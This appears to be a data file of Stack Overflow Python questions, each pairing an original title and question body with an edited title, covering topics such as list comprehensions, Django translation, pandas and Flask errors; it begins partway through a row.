quill""a = a.replace("","", """").replace("":"","""").replace(""!"","""").replace(""'"","""").replace("";"","""").lower()b = b.replace("","", """").replace("":"","""").replace(""!"","""").replace(""'"","""").replace("";"","""").lower()print matches(a,b) ['e', ' all', ' white a sheet of', ' spotless paper when ', 'y', ' first are born but ', 'y', ' are to be scrawled', ' and blotted by every goose', ' quill']",Find maximum length of all n-word-length substrings shared by two strings
how to I invert a 2d list in python, I have a 2d list like this: and I want to make this: I've tried to do a for loop and switch each value but I keep getting an index out of bound error. Here's what I have: <code>  1 2 3 4 5 6 1 4 2 5 3 6 for i in results: for j in range(numCenturies): rotated[i][j] = results [j][i],How to I invert a 2d list in python
Typing effect in Pyton," I want to make such program which reads characters from a string and prints each character after some delay so its look like typing effect.Now my problem is sleep function is not working properly. It print whole sentence after long delay. I use ""sys.stdout.write"" for removing whitespace between characters. <code>  import sysfrom time import sleepwords = ""This is just a test :P""for char in words: sleep(0.5) sys.stdout.write(char)",Typing effect in Python
Python Tutrtle pen colour," When I call t.pencolor('83, 58, 27') (turtle is imported as t) I get the TurtleGraphicsError: bad color string: 83, 58, 27 even though I have (I think) changed my colour mode. I run python 2.7 on OS 10.9 <code>  t.colormode(255) t.pencolor('83, 58, 27')",Python Turtle pen colour
django - set user permissions when user is automatically created," Django 1.5, python 2.6The model automatically creates a user under certain conditions: In addition to setting the username, password, and is_staff status, I would like to set the user's permissions - something like: or Is this possible? Thank you! <code>  User.objects.get_or_create(username=new_user_name, is_staff=True) u = User.objects.get(username=new_user_name)u.set_password('temporary') u.user_permissions('Can view poll') u.set_permissions('Can change poll')",django - set user permissions when user is automatically created using get_or_create
Ubuntu 12.04 LTS: Update python 2.7.3 to 2.7.6 without break dependencies," So, I recently reinstalled Precise after encountering some swap issues. A friend and I were discussing working on something in Python together, so I checked my version. However, 12.04 comes with Python 2.7.3 installed. I wanted to update to 2.7.6, so I downloaded the tar for it. Then, I was silly enough to punch in sudo apt-get remove python without considering the dependency issues for my desktop. (My rationale was that I wanted to get rid of the old install.)Long story short, I broke all of my Python dependencies, thus destroying Unity. I just finished re-installing Ubuntu again.I tried following this tutorial, butmake test had about a 50% failure rate (a separate concern in itself)When I entered make install && chmod -v 755 /usr/lib/libpython2.7.so.1.0I got I'm concerned, as a result, that running the command again as root would result in removing 2.7.3 all over again. I'm anything but a bash guru, so I don't have a good sense for what's going under the hood here. I'm just trying to get 2.7.6 at this point; I'm perfectly content with 2.7.3 staying on the machine if there are dependencies.So, should I...A. just run the command as root?B. update Python some other way (and by ""update"" I really just mean get a clean install of 2.7.6)? If so, how? <code>  /usr/bin/install -c python /usr/bin/python2.7/usr/bin/install: cannot remove `/usr/bin/python2.7': Permission deniedmake: *** [altbininstall] Error 1",Ubuntu 12.04 LTS: Update python 2.7.3 to 2.7.6 without breaking dependencies
How to setup Django trnaslation correct up," I've got an issue with translations not working on Django 1.6. I've added this to my settings.py: Also added middlewares: as well as to my *.py files whenever I'm using a string which shall be l10nd: My templates start with: and inside the template I used the trans placeholder. E.g. I have provided translations in locale/de/LC_MESSAGES/django.po: My browser is set to request German content first:Browser settingsWhat did I miss?P.S. The project I'm currently fuzzy around is hosted on GitHub: https://github.com/frlan/blankspot <code>  LANGUAGE_CODE = 'en-us'ugettext = lambda s: sLANGUAGES = ( ('en', ugettext('English')), ('de', ugettext('German')),) MIDDLEWARE_CLASSES = ( 'django.middleware.common.CommonMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',) from django.utils.translation import ugettext_lazy as _ {% extends ""base.html"" %}{% load i18n %} <h1>{% trans ""Register a tank"" %}</h1> msgid ""Register a tank""msgstr ""Einen neuen Tank anmelden""",What's the correct way to set up Django translation?
How to setup up Django translation in the correct way?," I've got an issue with translations not working on Django 1.6. I've added this to my settings.py: Also added middlewares: as well as to my *.py files whenever I'm using a string which shall be l10nd: My templates start with: and inside the template I used the trans placeholder. E.g. I have provided translations in locale/de/LC_MESSAGES/django.po: My browser is set to request German content first:Browser settingsWhat did I miss?P.S. The project I'm currently fuzzy around is hosted on GitHub: https://github.com/frlan/blankspot <code>  LANGUAGE_CODE = 'en-us'ugettext = lambda s: sLANGUAGES = ( ('en', ugettext('English')), ('de', ugettext('German')),) MIDDLEWARE_CLASSES = ( 'django.middleware.common.CommonMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',) from django.utils.translation import ugettext_lazy as _ {% extends ""base.html"" %}{% load i18n %} <h1>{% trans ""Register a tank"" %}</h1> msgid ""Register a tank""msgstr ""Einen neuen Tank anmelden""",What's the correct way to set up Django translation?
Getting top biggest values from each column of the `pandas.DataFrame`?," Here is my pandas.DataFrame: I want to create a new DataFrame that will contain top 3 values from each column of my data DataFrame.Here is an expected output: How can I do that? <code>  import pandas as pddata = pd.DataFrame({ 'first': [40, 32, 56, 12, 89], 'second': [13, 45, 76, 19, 45], 'third': [98, 56, 87, 12, 67]}, index = ['first', 'second', 'third', 'fourth', 'fifth']) first second third0 89 76 981 56 45 872 40 45 67",Get top biggest values from each column of the pandas.DataFrame
Python | Access the sole element of a set," I have a set in Python from which I am removing elements one by one based on a condition. When the set is left with just 1 element, I need to return that element. How do I access this element from the set?A simplified example: <code>  S = set(range(5))for i in range(4): S = S - {i}# now S has only 1 element: 4return ? # how should I access this element# a lame way is the following# for e in S:# return S",Access the sole element of a set
How to calculate inverse normal distribution in python?, How do I calculate the inverse of the cumulative distribution function (CDF) of the normal distribution in Python?Which library should I use? Possibly scipy?  <code> ,How to calculate the inverse of the normal cumulative distribution function in python?
python list comprehension explained," I have no problem understanding this: I thought that was all, but then I found this snippet: Which makes b = [1,2,3,4,5,6]. The problem is I'm having trouble understanding the syntax in [x for xs in a for x in xs], Could anyone explain how it works? <code>  a = [1,2,3,4]b = [x for x in a] a = [[1,2],[3,4],[5,6]]b = [x for xs in a for x in xs]",Explanation of how nested list comprehension works?
"How does list comprehension for ""nested"" list work?"," I have no problem understanding this: I thought that was all, but then I found this snippet: Which makes b = [1,2,3,4,5,6]. The problem is I'm having trouble understanding the syntax in [x for xs in a for x in xs], Could anyone explain how it works? <code>  a = [1,2,3,4]b = [x for x in a] a = [[1,2],[3,4],[5,6]]b = [x for xs in a for x in xs]",Explanation of how nested list comprehension works?
Explain the flattening of a list using nested list comprehension," I have no problem understanding this: I thought that was all, but then I found this snippet: Which makes b = [1,2,3,4,5,6]. The problem is I'm having trouble understanding the syntax in [x for xs in a for x in xs], Could anyone explain how it works? <code>  a = [1,2,3,4]b = [x for x in a] a = [[1,2],[3,4],[5,6]]b = [x for xs in a for x in xs]",Explanation of how nested list comprehension works?
python list comprehension explained," I have no problem understanding this: I thought that was all, but then I found this snippet: Which makes b = [1,2,3,4,5,6]. The problem is I'm having trouble understanding the syntax in [x for xs in a for x in xs], Could anyone explain how it works? <code>  a = [1,2,3,4]b = [x for x in a] a = [[1,2],[3,4],[5,6]]b = [x for xs in a for x in xs]",Explanation of how nested list comprehension works?
Explanation of how list comprehension works?," I have no problem understanding this: I thought that was all, but then I found this snippet: Which makes b = [1,2,3,4,5,6]. The problem is I'm having trouble understanding the syntax in [x for xs in a for x in xs], Could anyone explain how it works? <code>  a = [1,2,3,4]b = [x for x in a] a = [[1,2],[3,4],[5,6]]b = [x for xs in a for x in xs]",Explanation of how nested list comprehension works?
Python - should all member variables be initialized in __init__," Maybe this is more of a style question than a technical one but I have a class with several member variables and I want to have it work so that some of the member variables are initialized when the user first creates an instance of the class (i.e. in the __init__ function) and I want the other member variables to be defined from arguments of member functions that will be called later on. So my question is should I initialize all member variables in the __init__ function (and set the ones that will be defined later on to dummy values) or initialize some in the __init__ function and some in later functions. I realize this might be difficult to understand so here are a couple of examples.This example has var3 set to 0 initially in the __init__ function, then set to the desired value later on in the my_funct function. and in this example, var3 is not defined at all in the __init__ function I don't think either way would make a big difference (maybe a slight difference in memory usage). But I was wondering if one of these is preferred over the other for some reason. <code>  class myClass(object): def __init__(self,var1,var2): self.var1=var1 self.var2=var2 self.var3=0 def my_funct(self,var3): self.var3=var3 class myClass(object): def __init__(self,var1,var2): self.var1=var1 self.var2=var2 def my_funct(self,var3): self.var3=var3",Should all member variables be initialized in __init__
find a string and insert text after that in pyhton," I am still learner in python. I was not able to find a specific string and insert multiple strings after that string in python. I want to search the line in the file and insert the content of write functionI have tried the following which is inserting at the end of the file.  <code>  line = '<abc hij kdkd>'dataFile = open('C:\\Users\\Malik\\Desktop\\release_0.5\\release_0.5\\5075442.xml', 'a')dataFile.write('<!--Delivery Date: 02/15/2013-->\n<!--XML Script: 1.0.0.1-->\n')dataFile.close()",Find a string and insert text after it in Python
How can I approximate the periodicity of a panda time Series," Is there a way to approximate the periodicity of a time series in pandas? For R, the xts objects have a method called periodicity that serves exactly this purpose. Is there an implemented method to do so? For instance, can we infer the frequency from time series that do not specify frequency? The frequency of this series can reasonably be approximated to be daily.Update:I think it might be helpful to show the source code of R's implementation of the periodicity method. I think this line is the key, which I don't quite understandp <- median(diff(.index(x))) <code>  import pandas.io.data as webaapl = web.get_data_yahoo(""AAPL"")<class 'pandas.tseries.index.DatetimeIndex'>[2010-01-04 00:00:00, ..., 2013-12-19 00:00:00]Length: 999, Freq: None, Timezone: None function (x, ...) { if (timeBased(x) || !is.xts(x)) x <- try.xts(x, error = ""'x' needs to be timeBased or xtsible"") p <- median(diff(.index(x))) if (is.na(p)) stop(""can not calculate periodicity of 1 observation"") units <- ""days"" scale <- ""yearly"" label <- ""year"" if (p < 60) { units <- ""secs"" scale <- ""seconds"" label <- ""second"" } else if (p < 3600) { units <- ""mins"" scale <- ""minute"" label <- ""minute"" p <- p/60L } else if (p < 86400) { units <- ""hours"" scale <- ""hourly"" label <- ""hour"" } else if (p == 86400) { scale <- ""daily"" label <- ""day"" } else if (p <= 604800) { scale <- ""weekly"" label <- ""week"" } else if (p <= 2678400) { scale <- ""monthly"" label <- ""month"" } else if (p <= 7948800) { scale <- ""quarterly"" label <- ""quarter"" } structure(list(difftime = structure(p, units = units, class = ""difftime""), frequency = p, start = start(x), end = end(x), units = units, scale = scale, label = label), class = ""periodicity"")}",How can I approximate the periodicity of a pandas time Series
Validation in SqlAlchemy," How can I get the required validator in SQLAlchemy? Actually I just wanna be confident the user filled all required field in a form. I use PostgreSQL, but it doesn't make sense, since the tables created from Objects in my models.py file: So this nullable=False doesn't work, because the records added in any case with empty fields. I can of course set the restrictions at the database level by set name to NOT NULL for example. But there must be something about validation in SQLAlchemy isn't it? I came from yii php framework, there it's not the problem at all. <code>  from sqlalchemy import ( Column, Integer, Text, DateTime, )from sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import ( scoped_session, sessionmaker, )from zope.sqlalchemy import ZopeTransactionExtensionfrom pyramid.security import ( Allow, Everyone, )Base = declarative_base()class Article(Base): """""" The SQLAlchemy declarative model class for a Article object. """""" __tablename__ = 'article' id = Column(Integer, primary_key=True) name = Column(Text, nullable=False, unique=True) url = Column(Text, nullable=False, unique=True) title = Column(Text) preview = Column(Text) content = Column(Text) cat_id = Column(Integer, nullable=False) views = Column(Integer) popular = Column(Integer) created = Column(DateTime) def __unicode__(self): return unicode(self.name)",Validation in SQLAlchemy
Returning data from pythonn to node.js," I've been following along with a couple examples I found to call a Python script from Node. I'm able to execute the script, but I can't return data from Python.test.js test.py Could someone provide an example of how to return the results from test.py to test.js?Thanks.Note: test.py edited for proper indent. <code>  var sys = require('sys'), spawn = require('child_process').spawn, dummy = spawn('python', ['test.py']);dummy.stdout.on('data', function (data) {sys.print(""testing...\n"");sys.print(data);}); import timedef dummy() : out = ''; for i in range(0,10) : out += str(i + 1) + ""\n"" time.sleep(0.1) print out return outif __name__ =='__main__' : dummy = dummy()",Returning data from Python to node.js
Probability to z-score and vice versa in python," How do I calculate the z score of a p-value and vice versa?For example if I have a p-value of 0.95 I should get 1.96 in return.I saw some functions in scipy but they only run a z-test on an array.I have access to numpy, statsmodel, pandas, and scipy (I think). <code> ",Probability to z-score and vice versa
contours with map overlay on irregular grid in python," Here is my data: And here is the code I tried. The part which is giving me problem is gridding of data and contouring. The code below is mainly from various posts on stackoverflow, but it has not been easy to find anything that addresses my particular subject. Here is the error I get on the contouring part: I have no idea what the 30j is supposed to do in the above code, though my data has 29 points <code>  Lon Lat Z Z2 pos32.6 -13.6 41 9 CHIP27.1 -16.9 43 12 CHOM32.7 -10.2 46 14 ISOK24.2 -13.6 33 13 KABO28.5 -14.4 43 11 KABW28.1 -12.6 33 16 KAFI27.9 -15.8 46 13 KAFU24.8 -14.8 44 9 KAOM31.1 -10.2 35 14 KASA25.9 -13.5 24 8 KASE29.1 -9.8 10 13 KAWA25.8 -17.8 39 11 LIVI33.2 -12.3 44 8 LUND28.3 -15.4 46 12 LUSA27.6 -16.1 47 9 MAGO28.9 -11.1 31 15 MANS31.3 -8.9 39 9 MBAL31.9 -13.3 45 9 MFUW23.1 -15.3 31 9 MONG31.4 -11.9 39 9 MPIK27.1 -15.0 42 12 MUMB24.4 -11.8 15 9 MWIN28.6 -13.0 39 9 NDOL31.3 -14.3 44 12 PETA23.3 -16.1 39 5 SENA30.2 -13.2 38 11 SERE24.3 -17.5 32 10 SESH26.4 -12.2 23 12 SOLW23.1 -13.5 27 14 ZAMB #!/usr/bin/pythonfrom mpl_toolkits.basemap import Basemapimport matplotlib.pyplot as pltimport numpy as npfrom scipy.interpolate import griddata#prepare a basemapm = Basemap(projection = 'merc',llcrnrlon = 21, llcrnrlat = -18, urcrnrlon = 34, urcrnrlat = -8)m.drawmapboundary(fill_color = 'white')m.fillcontinents(color = '0.85')# draw country outlines.m.drawcountries(linewidth=0.5, linestyle='solid', color='k', antialiased=1, ax=None, zorder=None)m.drawparallels(np.arange(-18, -8, 2.), color = '0.25', linewidth = 0.5)m.drawparallels(parallels,labels=[True,False,False,False])m.drawmeridians(np.arange(21,36, 2.), color = '0.25', linewidth = 0.5)m.drawmeridians(meridians,labels=[False,False,False,True])#plt.show() ##Code works up to here, drawing basemap########################################################prepare data for contouring#declare empty arrays for xyzxarray = []yarray = []zarray = []#get data and pack in the arrayswith open(""meansr.txt"", ""r"") as f: for line in f: (x, y, z, z2, pos) = line.split() xarray.append(x) yarray.append(y) zarray.append(z) f.close()#prepare and grid the dataextent = (min(xarray), max(xarray), min(yarray), max(yarray))xs,ys = np.mgrid[extent[0]:extent[1]:30j, extent[2]:extent[3]:30j]z = griddata((xarray, yarray), zarray, (xs, ys))x,y = m(xarray,yarray)#make contour plotcs = m.contourf(x, y, z)cs2 = m.contour(x,y,z, levels = range(10,50,5),colors = 'blue')plt.clabel(cs, fmt = '%.0f', inline = True)plt.show() Traceback (most recent call last):File ""./contour12.py"", line 44, in <module>xs,ys = np.mgrid[extent[0]:extent[1]:29j, extent[2]:extent[3]:29j]File ""/home/zmumba/anaconda/lib/python2.7/site-packages/numpy/lib/index_tricks.py"", line 185, in __getitem__step = key.stepAttributeError: 'tuple' object has no attribute 'step'",Contours with map overlay on irregular grid in python
Python check if function exists without try, In python how do you check if a function exists without actually running the function (i.e. using try)? I would be testing if it exists in a module. <code> ,Python check if function exists without running it
Finding bogus data in a pandas dataframe," I'm trying to analyse the weather records for New York, using the daily data taken from here: http://cdiac.ornl.gov/epubs/ndp/ushcn/daily_doc.htmlI'm loading the data with: Where: Now, the issue I have is that when reading in the data, there seem to be a lot of inf values, and those shouldn't be in the source data (the nearest thing in the data are -9999 values, which represent invalid data).Normally, if I were using lists or the like, I would print out the whole thing to find alignment errors, and work out which rows are affected, then look at the source file to see what's happening. I'd like to know how to do the equivalent in pandas so I can figure out where these inf values are coming from.Here's the code which shows me infs: Edit: Corrected column widths. Problem still remains. <code>  tf = pandas.read_fwf(io.open('state30_NY.txt'), widths=widths, names=names, na_values=['-9999']) >>> widths[6, 4, 2, 4, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1, 5, 1, 1, 1]>>> names['COOP', 'YEAR', 'MONTH', 'ELEMENT', 'VALUE1', 'MFLAG1', 'QFLAG1', 'SFLAG1', 'VALUE2', 'MFLAG2', 'QFLAG2', 'SFLAG2', 'VALUE3', 'MFLAG3', 'QFLAG3', 'SFLAG3', 'VALUE4', 'MFLAG4', 'QFLAG4', 'SFLAG4', 'VALUE5', 'MFLAG5', 'QFLAG5', 'SFLAG5', 'VALUE6', 'MFLAG6', 'QFLAG6', 'SFLAG6', 'VALUE7', 'MFLAG7', 'QFLAG7', 'SFLAG7', 'VALUE8', 'MFLAG8', 'QFLAG8', 'SFLAG8', 'VALUE9', 'MFLAG9', 'QFLAG9', 'SFLAG9', 'VALUE10', 'MFLAG10', 'QFLAG10', 'SFLAG10', 'VALUE11', 'MFLAG11', 'QFLAG11', 'SFLAG11', 'VALUE12', 'MFLAG12', 'QFLAG12', 'SFLAG12', 'VALUE13', 'MFLAG13', 'QFLAG13', 'SFLAG13', 'VALUE14', 'MFLAG14', 'QFLAG14', 'SFLAG14', 'VALUE15', 'MFLAG15', 'QFLAG15', 'SFLAG15', 'VALUE16', 'MFLAG16', 'QFLAG16', 'SFLAG16', 'VALUE17', 'MFLAG17', 'QFLAG17', 'SFLAG17', 'VALUE18', 'MFLAG18', 'QFLAG18', 'SFLAG18', 'VALUE19', 'MFLAG19', 'QFLAG19', 'SFLAG19', 'VALUE20', 'MFLAG20', 'QFLAG20', 'SFLAG20', 'VALUE21', 'MFLAG21', 'QFLAG21', 'SFLAG21', 'VALUE22', 'MFLAG22', 'QFLAG22', 'SFLAG22', 'VALUE23', 'MFLAG23', 'QFLAG23', 'SFLAG23', 'VALUE24', 'MFLAG24', 'QFLAG24', 'SFLAG24', 'VALUE25', 'MFLAG25', 'QFLAG25', 'SFLAG25', 'VALUE26', 'MFLAG26', 'QFLAG26', 'SFLAG26', 'VALUE27', 'MFLAG27', 'QFLAG27', 'SFLAG27', 'VALUE28', 'MFLAG28', 'QFLAG28', 'SFLAG28', 'VALUE29', 'MFLAG29', 'QFLAG29', 'SFLAG29', 'VALUE30', 'MFLAG30', 'QFLAG30', 'SFLAG30', 'VALUE31', 'MFLAG31', 'QFLAG31', 'SFLAG31'] >>> tf[tf['ELEMENT']=='TMIN'].min()COOP 300023YEAR 1876MONTH 1ELEMENT TMINVALUE1 -38MFLAG1 infQFLAG1 infSFLAG1 infVALUE2 -34MFLAG2 infQFLAG2 infSFLAG2 infVALUE3 -38MFLAG3 infQFLAG3 inf...MFLAG28 infQFLAG28 infSFLAG28 infVALUE29 -46MFLAG29 infQFLAG29 infSFLAG29 infVALUE30 -57MFLAG30 infQFLAG30 infSFLAG30 infVALUE31 -40MFLAG31 infQFLAG31 infSFLAG31 infLength: 128, dtype: object",Finding bogus data in a pandas dataframe read with read_fwf()
Changing Pipe separated to Dataframe in Python Pandas," I have pipe-separated values like this: I have to create a Pandas DataFrame out of this data, with each column given a name. <code>  https|clients4.google.com|application/octet-stream|2296|https|clients4.google.com|text/html; charset=utf-8|0|........https|clients4.google.com|application/octet-stream|2291|",Changing Pipe separated data to Dataframe in Python Pandas
How to sort Counter by value? - python," Other than doing list comprehensions of reversed list comprehension, is there a pythonic way to sort Counter by value? If so, it is faster than this: <code>  >>> from collections import Counter>>> x = Counter({'a':5, 'b':3, 'c':7})>>> sorted(x)['a', 'b', 'c']>>> sorted(x.items())[('a', 5), ('b', 3), ('c', 7)]>>> [(l,k) for k,l in sorted([(j,i) for i,j in x.items()])][('b', 3), ('a', 5), ('c', 7)]>>> [(l,k) for k,l in sorted([(j,i) for i,j in x.items()], reverse=True)][('c', 7), ('a', 5), ('b', 3)",How to sort a Counter by value?
Python multiprocessing- sharing a complex object," I've got a large dict-like object that needs to be shared between a number of worker processes. Each worker reads a random subset of the information in the object and does some computation with it. I'd like to avoid copying the large object as my machine quickly runs out of memory.I was playing with the code for this SO question and I modified it a bit to use a fixed-size process pool, which is better suited to my use case. This however seems to break it. The output is As you can see, in the first case all worker processes get the same object (by id). In the second case, the id is not the same. Does that mean the object is being copied?P.S. I don't think that matters, but I am using joblib, which internally used a Pool: which outputs: <code>  from multiprocessing import Process, Poolfrom multiprocessing.managers import BaseManagerclass numeri(object): def __init__(self): self.nl = [] def getLen(self): return len(self.nl) def stampa(self): print self.nl def appendi(self, x): self.nl.append(x) def svuota(self): for i in range(len(self.nl)): del self.nl[0]class numManager(BaseManager): passdef produce(listaNumeri): print 'producing', id(listaNumeri) return id(listaNumeri)def main(): numManager.register('numeri', numeri, exposed=['getLen', 'appendi', 'svuota', 'stampa']) mymanager = numManager() mymanager.start() listaNumeri = mymanager.numeri() print id(listaNumeri) print '------------ Process' for i in range(5): producer = Process(target=produce, args=(listaNumeri,)) producer.start() producer.join() print '--------------- Pool' pool = Pool(processes=1) for i in range(5): pool.apply_async(produce, args=(listaNumeri,)).get()if __name__ == '__main__': main() 4315705168------------ Processproducing 4315705168producing 4315705168producing 4315705168producing 4315705168producing 4315705168--------------- Poolproducing 4299771152producing 4315861712producing 4299771152producing 4315861712producing 4299771152 from joblib import delayed, Parallelprint '------------- Joblib' Parallel(n_jobs=4)(delayed(produce)(listaNumeri) for i in range(5)) ------------- Joblibproducing 4315862096producing 4315862288producing 4315862480producing 4315862672producing 4315862352",multiprocessing - sharing a complex object
"Python loop, only process the first in the array?"," I want to do something different to the the first item in a list. What is the most pythonic way of doing so? <code>  for item in list: # only if its the first item, do something # otherwise do something else",How to do something only to the first item within a loop in python?
"Loop over list, process first item separately"," I want to do something different to the the first item in a list. What is the most pythonic way of doing so? <code>  for item in list: # only if its the first item, do something # otherwise do something else",How to do something only to the first item within a loop in python?
How to iterate through list but do something special to first item within the loop," I want to do something different to the the first item in a list. What is the most pythonic way of doing so? <code>  for item in list: # only if its the first item, do something # otherwise do something else",How to do something only to the first item within a loop in python?
Most pythonic way to do something when it is the first item in a list," I want to do something different to the the first item in a list. What is the most pythonic way of doing so? <code>  for item in list: # only if its the first item, do something # otherwise do something else",How to do something only to the first item within a loop in python?
How to do something to only the first item in a list when iterating?," I want to do something different to the the first item in a list. What is the most pythonic way of doing so? <code>  for item in list: # only if its the first item, do something # otherwise do something else",How to do something only to the first item within a loop in python?
Python randomly generated IP address of the string," In Python, what should I do if I want to generate a random string in the form of an IP address? For example: ""10.0.1.1"", ""10.0.3.14"", ""172.23.35.1"" and so on. Could someone give me some help? <code> ",Python randomly generated IP address as string
Howto Subdomain Dispatcher with Flask," I have the following structure in my project And the following code:run.py views.py _init_.py I'm trying to use the factory design pattern to create my app objects with different config files each time, and with a subdomain dispatcher be able to create and route different objects depending on the subdomain on the user request.I'm following the Flask documentation where they talk about, all of this:Application ContextApplitation FactoriesApplication with BlueprintsApplication DispatchingBut I couldn't make it work, it seems that with my actual project structure there are no way to pass throw the app object to my views.py and it throw and NameError NameError: name 'app' is not defined <code>  \ myapp \ app __init__.py views.py run.py from app import create_appif __name__ == '__main__': app = create_app() app.run(debug=True, host='0.0.0.0', port=5001) @app.route(""/"")def index(): return ""Hello World!"" from flask import Flaskdef create_app(): app = Flask(__name__) from app import views return app",NameError: name 'app' is not defined with Flask
NameError: name 'app' is not defined with Flask," I have the following structure in my project And the following code:run.py views.py _init_.py I'm trying to use the factory design pattern to create my app objects with different config files each time, and with a subdomain dispatcher be able to create and route different objects depending on the subdomain on the user request.I'm following the Flask documentation where they talk about, all of this:Application ContextApplitation FactoriesApplication with BlueprintsApplication DispatchingBut I couldn't make it work, it seems that with my actual project structure there are no way to pass throw the app object to my views.py and it throw and NameError NameError: name 'app' is not defined <code>  \ myapp \ app __init__.py views.py run.py from app import create_appif __name__ == '__main__': app = create_app() app.run(debug=True, host='0.0.0.0', port=5001) @app.route(""/"")def index(): return ""Hello World!"" from flask import Flaskdef create_app(): app = Flask(__name__) from app import views return app",NameError: name 'app' is not defined with Flask
NameError: name 'app' is not defined with Flask [SOLVED]," I have the following structure in my project And the following code:run.py views.py _init_.py I'm trying to use the factory design pattern to create my app objects with different config files each time, and with a subdomain dispatcher be able to create and route different objects depending on the subdomain on the user request.I'm following the Flask documentation where they talk about, all of this:Application ContextApplitation FactoriesApplication with BlueprintsApplication DispatchingBut I couldn't make it work, it seems that with my actual project structure there are no way to pass throw the app object to my views.py and it throw and NameError NameError: name 'app' is not defined <code>  \ myapp \ app __init__.py views.py run.py from app import create_appif __name__ == '__main__': app = create_app() app.run(debug=True, host='0.0.0.0', port=5001) @app.route(""/"")def index(): return ""Hello World!"" from flask import Flaskdef create_app(): app = Flask(__name__) from app import views return app",NameError: name 'app' is not defined with Flask
pass a function as a parameter in python," Suppose I want to calculate the following f(f(...f(x)..) .Basically many times function of itself.Currently I am doing the following to achieve this result (and to return all the intermediate steps): and then I am passing my function funcM as an argument:print iterator(funcM, 100, 5).There is nothing wrong with this approach, and calculations are correct.But is there a way to do the same without defining function funcM ?May be passing lambda function as an argument to iterator function (Sorry if it does not make sense, I do not really know what lambda functions are). <code>  def iterator(function, x, n=4): x = float(x) arr = [] for i in range(n + 1): arr.append(x) x = function(x) return arrdef funcM(x): return x / 4 + 12",passing a function as an argument in python
How can i read an image from an internet url in python cv2?," How can I read an image from an Internet URL in Python cv2?This Stack Overflow answer, is not good because Python reported to me: <code>  import cv2.cv as cvimport urllib2from cStringIO import StringIOimport PIL.Image as pilurl=""some_url""img_file = urllib2.urlopen(url)im = StringIO(img_file.read()) TypeError: object.__new__(cStringIO.StringI) is not safe, use cStringIO.StringI.__new__","How can I read an image from an Internet URL in Python cv2, scikit image and mahotas?"
How can i read an image from an internet url in python cv2 and scikit image?," How can I read an image from an Internet URL in Python cv2?This Stack Overflow answer, is not good because Python reported to me: <code>  import cv2.cv as cvimport urllib2from cStringIO import StringIOimport PIL.Image as pilurl=""some_url""img_file = urllib2.urlopen(url)im = StringIO(img_file.read()) TypeError: object.__new__(cStringIO.StringI) is not safe, use cStringIO.StringI.__new__","How can I read an image from an Internet URL in Python cv2, scikit image and mahotas?"
"How can i read an image from an internet url in python cv2 , scikit image and mahotas?"," How can I read an image from an Internet URL in Python cv2?This Stack Overflow answer, is not good because Python reported to me: <code>  import cv2.cv as cvimport urllib2from cStringIO import StringIOimport PIL.Image as pilurl=""some_url""img_file = urllib2.urlopen(url)im = StringIO(img_file.read()) TypeError: object.__new__(cStringIO.StringI) is not safe, use cStringIO.StringI.__new__","How can I read an image from an Internet URL in Python cv2, scikit image and mahotas?"
Python: Advertise service across a local network," I have a ""server"" python script running on one of the local network machines, which waits for clients to connect, and passes them some work to do. The server and client code have both been written, and are working as expected...The problem is, this server might be running from any machine in the local network, so I can't hard code the address in the script... I immediately wondered if I can make a machine advertise about its existence, and clients can respond to that. Is that doable in Python with the standard library? I really don't have time to download twisted or tornado and learn about them, unfortunately, so I need something simple.I tried to think more about it, and realized I can have a single static IP machine where servers register/unregister from and clients can look for servers from there. Kind of like a torrent tracker, I think. This'll have to do if I can't do the service advertising approach easily. <code> ",Python service discovery: Advertise a service across a local network
python numpy average with nans," First things first: this is not a duplicate of NumPy: calculate averages with NaNs removed, i'll explain why:Suppose I have an array and I want to average over it with the weights ok. So this is pretty straightforward. But now I have something like this: calculating the average with the usual method yields of coursenan. Can I avoid this?In principle I want to ignore the nans, so I'd like to have something like this: <code>  a = array([1,2,3,4]) weights = [4,3,2,1]output = average(a, weights=weights)print output 2.0 a = array([1,2,nan,4]) a = array([1,2,4])weights = [4,3,1]output = average(a, weights=weights)print output 1.75",python numpy weighted average with nans
"where is ""from __future__ import braces"" code"," I was wondering what is exactly the code that executed on the command: so, since python is open-sourced I opened C:\Python27\Lib\__future__.py and looked.surprisingly, I found nothing there that handle importing braces module.so, my question is, where is the code that handle this? what happen when I run that command? <code>  >>> from __future__ import bracesSyntaxError: not a chance","Where is the ""from __future__ import braces"" code?"
